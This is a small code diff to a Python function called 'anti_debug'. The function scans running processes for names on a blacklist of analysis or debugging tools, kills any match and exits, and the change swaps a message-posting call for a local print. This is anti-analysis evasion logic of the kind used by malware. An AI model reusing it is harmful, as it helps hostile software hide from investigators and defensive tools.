@@ -44,7 +44,7 @@ def anti_debug():
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in program_blacklist):
                 try:
-                    post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...")
+                    print(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...")
                     proc.kill()
                     os._exit(1)
                 except(psutil.NoSuchProcess, psutil.AccessDenied): pass
